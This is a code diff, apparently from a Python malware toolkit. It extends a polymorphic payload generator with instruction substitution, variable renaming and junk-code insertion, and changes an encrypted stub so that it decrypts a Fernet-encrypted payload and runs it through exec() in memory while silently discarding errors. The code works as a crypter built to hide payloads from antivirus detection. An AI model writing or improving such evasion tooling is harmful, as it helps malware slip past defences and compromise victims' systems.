@@ -28,29 +28,39 @@ def reorder_functions(functions):
     random.shuffle(functions)
     return functions
 
+def substitute_instructions(code):
+    """
+    Substitutes common instructions with equivalent, but less common ones.
+    (This is a simplified example using string replacement.)
+    """
+    substitutions = {
+        "x = x + 1": ["x += 1", "x -= -1"],
+        "y = y * 2": ["y = y << 1", "y += y"],
+    }
+    for original, replacements in substitutions.items():
+        if original in code:
+            code = code.replace(original, random.choice(replacements))
+    return code
+
 def create_polymorphic_payload(base_payload_code):
     """
     Applies various obfuscation techniques to a base payload.
-    (This is a simplified demonstration)
     """
-    # In a real scenario, you'd parse the code into an AST (Abstract Syntax Tree)
-    # to do this robustly. For now, we'll use string replacement for demonstration.
-
     # 1. Obfuscate variable names
-    # (Assuming we know the variable names in the base payload)
     variables_to_obfuscate = ["my_socket", "data_to_send"] # Example
     obfuscated_code = obfuscate_variables(base_payload_code, variables_to_obfuscate)
 
-    # 2. Insert junk code
+    # 2. Substitute instructions
+    obfuscated_code = substitute_instructions(obfuscated_code)
+
+    # 3. Insert junk code
     lines = obfuscated_code.split('\n')
     lines_with_junk = insert_junk_code(lines)
 
-    # 3. Reorder functions (if the payload has multiple functions)
-    # This part is more complex and would require parsing the code to identify
-    # function blocks. We'll skip the implementation for this demo.
+    # 4. Reorder functions (conceptual)
+    # This would require parsing the code into an AST to do safely.
 
     final_code = "\n".join(lines_with_junk)
-
     return final_code
 
 from cryptography.fernet import Fernet
@@ -102,14 +112,21 @@ if derived_key:
     else:
         # Standard, non-keyed stub
         stub = f"""
-# Standard stub
+# Standard stub with reflective loading
 from cryptography.fernet import Fernet
+import sys
+
 key = {key}
 encrypted_payload = {encrypted_payload}
+
+def reflective_exec(code):
+    # A simple in-memory execution
+    exec(code, globals())
+
 try:
     f = Fernet(key)
     decrypted_payload = f.decrypt(encrypted_payload)
-    exec(decrypted_payload)
+    reflective_exec(decrypted_payload)
 except Exception:
     pass
 """
